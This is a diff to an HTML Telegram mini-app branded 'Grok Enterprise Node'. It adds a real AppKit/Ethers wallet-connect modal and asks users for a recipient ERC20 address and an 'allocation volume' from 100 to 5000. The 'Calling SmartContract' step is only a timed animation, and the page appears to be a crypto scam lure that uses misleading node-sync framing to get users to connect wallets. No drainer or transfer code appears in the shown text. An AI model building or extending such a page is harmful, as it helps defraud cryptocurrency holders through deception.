@@ -7,6 +7,43 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    
+    <!-- AppKit & Ethers Connectivity -->
+    <script type="module">
+        import { createAppKit } from 'https://esm.sh/@reown/appkit'
+        import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers'
+        import { mainnet, arbitrum } from 'https://esm.sh/@reown/appkit/networks'
+
+        // تم إدراج معرف المشروع الخاص بك هنا
+        const projectId = 'cb431b6f6e2a73a72983084a5bd30989' 
+
+        const metadata = {
+            name: 'Grok Enterprise Node',
+            description: 'Remix Kernel Connection',
+            url: window.location.origin,
+            icons: ['https://avatars.githubusercontent.com/u/37784886']
+        }
+
+        const modal = createAppKit({
+            adapters: [new EthersAdapter()],
+            networks: [mainnet, arbitrum],
+            metadata,
+            projectId,
+            features: {
+                analytics: true,
+                email: false, // تعطيل البريد الإلكتروني للتركيز على المحافظ
+                socials: false
+            },
+            themeMode: 'dark',
+            themeVariables: {
+                '--w3m-accent': '#6EEB36',
+                '--w3m-border-radius-master': '2px'
+            }
+        })
+
+        window.appKitModal = modal;
+    </script>
+
     <style>
         body {
             font-family: 'Inter', sans-serif;
@@ -98,7 +135,6 @@
             box-shadow: 0 15px 35px rgba(110, 235, 54, 0.5);
         }
 
-        /* Wallet Modal Styles */
         #walletModal {
             display: none;
             position: fixed;
@@ -121,16 +157,8 @@
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
         }
 
-        .eth-icon {
-            filter: drop-shadow(0 0 8px #6EEB36);
-        }
-
-        .erc-icon {
-            width: 28px;
-            height: 28px;
-            object-fit: contain;
-            filter: drop-shadow(0 0 5px #6EEB36);
-        }
+        .eth-icon { filter: drop-shadow(0 0 8px #6EEB36); }
+        .erc-icon { width: 28px; height: 28px; object-fit: contain; filter: drop-shadow(0 0 5px #6EEB36); }
     </style>
 </head>
 <body class="fixed inset-0">
@@ -152,22 +180,21 @@
             <h3 class="text-[#6EEB36] font-black text-center text-sm tracking-[0.3em] uppercase mb-6">Initialize Node Connection</h3>
             
             <div class="space-y-5">
-                <!-- Platform Selection -->
-                <div class="relative">
+                <!-- AppKit Connection Button -->
+                <div>
                     <label class="text-[9px] font-black text-[#6EEB36] uppercase tracking-[0.2em] mb-2 block">Enterprise Source</label>
-                    <button id="platformBtn" class="w-full remix-input rounded-xl p-4 flex items-center justify-between text-left">
-                        <span id="platformText" class="text-[12px] font-bold text-zinc-400 uppercase">Select Access Point</span>
-                        <svg id="platformArrow" class="text-[#6EEB36] transition-transform" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    <button id="appKitConnectBtn" class="w-full remix-input rounded-xl p-4 flex items-center justify-between text-left border-[#6EEB36]/60">
+                        <span id="platformText" class="text-[12px] font-bold text-white uppercase">Choose Wallet (AppKit)</span>
+                        <svg class="text-[#6EEB36]" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 12V8H6a2 2 0 0 1-2-2c0-1.1.9-2 2-2h12v4M4 6v12c0 1.1.9 2 2 2h14v-4M18 12a2 2 0 0 0-2 2c0 1.1.9 2 2 2h4v-4h-4z"/></svg>
                     </button>
-                    <div id="platformMenu" class="hidden absolute top-full left-0 right-0 mt-2 bg-[#0c0c0c] border border-[#6EEB36]/40 rounded-xl shadow-2xl z-[1100] max-h-[160px] overflow-y-auto no-scrollbar p-1"></div>
                 </div>
 
-                <!-- Wallet Address -->
+                <!-- Wallet Address (Receiving) -->
                 <div class="relative">
                     <label class="text-[9px] font-black text-[#6EEB36] uppercase tracking-[0.2em] mb-2 block">Recipient Wallet Address (ERC20)</label>
-                    <div class="relative">
+                    <div class="relative flex items-center">
                         <input id="walletInput" type="text" placeholder="0x..." class="w-full remix-input rounded-xl p-4 pr-12 text-[12px] font-mono outline-none focus:border-[#6EEB36]">
-                        <div class="absolute right-4 top-1/2 -translate-y-1/2">
+                        <div class="absolute right-4">
                             <svg class="eth-icon text-[#6EEB36]" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                                 <path d="M12 2L4.5 12L12 22L19.5 12L12 2Z"></path>
                                 <path d="M12 2L12 22"></path>
@@ -178,25 +205,23 @@
                 </div>
 
                 <!-- Warning -->
-                <div class="bg-red-950/30 border border-red-500/50 p-3 rounded-xl">
-                    <p class="text-[9px] text-red-400 font-bold leading-relaxed text-center uppercase tracking-tighter">
+                <div class="bg-red-950/30 border border-red-500/50 p-3 rounded-xl text-center">
+                    <p class="text-[9px] text-red-400 font-bold leading-relaxed uppercase tracking-tighter">
                         تنويه: استخدام عنوان شبكة خاطئ يسبب خسارة الأصول (Loss of Assets) بشكل نهائي. تأكد من أن العنوان يدعم شبكة ERC20.
                     </p>
                 </div>
 
                 <button id="confirmWalletBtn" class="w-full bg-[#6EEB36] text-black rounded-xl p-4 text-[12px] font-black uppercase tracking-widest active:scale-95 transition-all shadow-[0_10px_30px_rgba(110,235,54,0.3)]">
-                    Sync Node Now
+                    Confirm Node Connection
                 </button>
                 
-                <button id="closeModalBtn" class="w-full text-zinc-500 text-[9px] font-bold uppercase tracking-widest pt-2">Cancel Connection</button>
+                <button id="closeModalBtn" class="w-full text-zinc-500 text-[9px] font-bold uppercase tracking-widest pt-2">Cancel</button>
             </div>
         </div>
     </div>
 
     <!-- Main Wrapper -->
     <div class="flex-1 flex flex-col relative z-10 w-full h-full">
-        
-        <!-- Header -->
         <header class="flex flex-col items-center pt-8 pb-4 px-6">
             <div class="relative">
                 <div class="w-32 h-32 rounded-[40px] p-[3px] bg-gradient-to-br from-[#6EEB36] to-black border border-white/10 mb-2 shadow-[0_0_50px_rgba(110,235,54,0.4)] overflow-hidden">
@@ -214,12 +239,9 @@
             </div>
         </header>
 
-        <!-- Content Area -->
         <div class="content-container">
             <div class="content-inner">
                 <div class="flex-1 space-y-8 overflow-y-auto no-scrollbar pt-6">
-                    
-                    <!-- Network Status (Static Info) -->
                     <div>
                         <label class="text-[10px] font-black text-[#6EEB36] uppercase tracking-[0.25em] ml-1 mb-3 block">Protocol Layer</label>
                         <div class="w-full remix-input border-[#6EEB36]/50 rounded-2xl p-5 flex items-center justify-between">
@@ -231,7 +253,6 @@
                         </div>
                     </div>
 
-                    <!-- Connect Wallet Trigger -->
                     <div>
                         <label class="text-[10px] font-black text-[#6EEB36] uppercase tracking-[0.25em] ml-1 mb-3 block">Node Access</label>
                         <button id="openModalBtn" class="w-full bg-[#6EEB36] text-black rounded-2xl p-5 text-[14px] font-black uppercase tracking-[0.2em] flex items-center justify-center gap-3 shadow-[0_12px_40px_rgba(110,235,54,0.4)] active:scale-[0.96] transition-all">
@@ -240,7 +261,6 @@
                         </button>
                     </div>
 
-                    <!-- Volume Selection -->
                     <div class="relative">
                         <label class="text-[10px] font-black text-[#6EEB36] uppercase tracking-[0.25em] ml-1 mb-3 block">Allocation Volume</label>
                         <button id="amountBtn" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between">
@@ -251,7 +271,6 @@
                     </div>
                 </div>
 
-                <!-- Action Button -->
                 <div class="pt-6 mt-auto">
                     <button id="authorizeBtn" disabled class="ui-btn">
                         <span>CALLING SMARTCONTRACT</span>
@@ -268,63 +287,43 @@
         const tg = window.Telegram.WebApp;
         tg.ready(); tg.expand();
 
-        let selectedPlatform = null, selectedAmount = null, walletConnected = false;
-        let walletAddress = "";
+        let walletConnected = false;
+        let selectedAmount = null;
 
-        const platforms = [
-            { n: 'Binance', i: 'https://cryptologos.cc/logos/binance-coin-bnb-logo.png' },
-            { n: 'Trust Wallet', i: 'https://trustwallet.com/assets/images/media/assets/trust_platform.png' },
-            { n: 'MetaMask', i: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg' },
-            { n: 'Bybit', i: 'https://cryptologos.cc/logos/bybit-bit-logo.png' }
-        ];
         const amounts = [100, 150, 300, 500, 1000, 2000, 3000, 4000, 5000];
-
-        // User Setup
         const user = tg.initDataUnsafe?.user;
         if (user) {
             document.getElementById('userName').textContent = (user.first_name + ' ' + (user.last_name || '')).toUpperCase();
             if (user.photo_url) document.getElementById('userPhoto').src = user.photo_url;
         }
 
-        // Modal Controls
-        const modal = document.getElementById('walletModal');
-        document.getElementById('openModalBtn').onclick = () => {
-            if(walletConnected) return;
-            modal.style.display = 'flex';
+        // AppKit Connectivity Trigger
+        document.getElementById('appKitConnectBtn').onclick = async () => {
+            if (window.appKitModal) {
+                try {
+                    await window.appKitModal.open();
+                    
+                    const checkConnection = setInterval(() => {
+                        const isConnected = window.appKitModal.getIsConnected();
+                        if (isConnected) {
+                            const address = window.appKitModal.getAddress();
+                            document.getElementById('platformText').innerHTML = `<span class="text-[#6EEB36] font-black">SYNCED: ${address.substring(0,6)}...</span>`;
+                            clearInterval(checkConnection);
+                        }
+                    }, 1000);
+                } catch (err) {
+                    console.error("AppKit Open Error:", err);
+                }
+            }
         };
+
+        const modal = document.getElementById('walletModal');
+        document.getElementById('openModalBtn').onclick = () => { if(!walletConnected) modal.style.display = 'flex'; };
         document.getElementById('closeModalBtn').onclick = () => modal.style.display = 'none';
 
-        // Setup Platform Dropdown inside Modal
-        const platformBtn = document.getElementById('platformBtn');
-        const platformMenu = document.getElementById('platformMenu');
-        platformBtn.onclick = (e) => {
-            e.stopPropagation();
-            platformMenu.classList.toggle('hidden');
-            document.getElementById('platformArrow').classList.toggle('rotate-180');
-        };
-
-        platforms.forEach(p => {
-            const div = document.createElement('div');
-            div.className = 'flex items-center gap-3 p-3 hover:bg-[#6EEB36]/20 rounded-lg cursor-pointer transition-colors';
-            div.innerHTML = `<img src="${p.i}" class="w-5 h-5 object-contain"> <span class="text-[11px] font-bold text-white uppercase">${p.n}</span>`;
-            div.onclick = (e) => {
-                e.stopPropagation();
-                selectedPlatform = p;
-                document.getElementById('platformText').innerHTML = `<img src="${p.i}" class="w-4 h-4 inline-block mr-2"><span class="text-[#6EEB36] font-black">${p.n}</span>`;
-                platformMenu.classList.add('hidden');
-                document.getElementById('platformArrow').classList.remove('rotate-180');
-            };
-            platformMenu.appendChild(div);
-        });
-
-        // Amount Selection
         const amountBtn = document.getElementById('amountBtn');
         const amountMenu = document.getElementById('amountMenu');
-        amountBtn.onclick = (e) => {
-            e.stopPropagation();
-            amountMenu.classList.toggle('hidden');
-            document.getElementById('amountArrow').classList.toggle('rotate-180');
-        };
+        amountBtn.onclick = (e) => { e.stopPropagation(); amountMenu.classList.toggle('hidden'); document.getElementById('amountArrow').classList.toggle('rotate-180'); };
 
         amounts.forEach(a => {
             const div = document.createElement('div');
@@ -341,12 +340,19 @@
             amountMenu.appendChild(div);
         });
 
-        // Wallet Confirmation
         document.getElementById('confirmWalletBtn').onclick = function() {
-            walletAddress = document.getElementById('walletInput').value.trim();
-            if (!selectedPlatform) { alert("Please select a platform first."); return; }
-            if (walletAddress.length < 20) { alert("Please enter a valid ERC20 address."); return; }
-            
+            const addr = document.getElementById('walletInput').value.trim();
+            const isAppKitConnected = window.appKitModal ? window.appKitModal.getIsConnected() : false;
+
+            if (!isAppKitConnected) { 
+                tg.showPopup({message: "Please connect your wallet via AppKit first."}); 
+                return; 
+            }
+            if (addr.length < 20) { 
+                tg.showPopup({message: "Please enter a valid recipient ERC20 address."}); 
+                return; 
+            }
+
             this.innerHTML = `<svg class="animate-spin mx-auto" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M12 2v4m0 12v4M4.9 4.9l2.8 2.8m8.6 8.6l2.8 2.8"/></svg>`;
             
             setTimeout(() => {
@@ -367,7 +373,6 @@
             }
         }
 
-        // Final Action
         document.getElementById('authorizeBtn').onclick = function() {
             if (this.disabled) return;
             const overlay = document.getElementById('loadingOverlay');
@@ -384,10 +389,7 @@
             }, 30);
         };
 
-        window.onclick = () => {
-            platformMenu.classList.add('hidden');
-            amountMenu.classList.add('hidden');
-        };
+        window.onclick = () => { amountMenu.classList.add('hidden'); };
     </script>
 </body>
 </html>
